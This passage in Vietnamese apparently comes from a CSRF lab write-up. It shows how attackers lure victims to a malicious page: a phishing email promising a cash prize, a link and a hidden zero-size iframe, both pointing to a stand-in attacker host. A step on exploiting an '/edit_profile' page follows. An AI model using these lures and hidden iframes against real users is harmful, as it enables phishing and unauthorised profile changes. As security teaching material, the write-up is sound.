Kẻ tấn công có thể **lừa nạn nhân mở trang HTML độc hại** bằng các cách:

- Gửi email phishing với tiêu đề hấp dẫn: "Bạn vừa trúng thưởng 10.000.000 VNĐ, nhấn vào đây để nhận!"
- Đặt liên kết trên diễn đàn, mạng xã hội:
```js
<a href="http://malicious-website.com/csrf_attack.html">Nhấn vào đây để nhận quà!</a>
```

- Nhúng iframe trên một trang hợp pháp:
```js
<iframe src="http://malicious-website.com/csrf_attack.html" width="0" height="0"></iframe>
```

**Nhưng ở trang web của tôi là qua hình thức nhắn tin**

##### Bước 3: Trang `/edit_profile` bị khai thác & thay đổi thông tin

![31](https://github.com/user-attachments/assets/65e3b952-d3f9-4da3-ad9d-bd13b13dcaba)
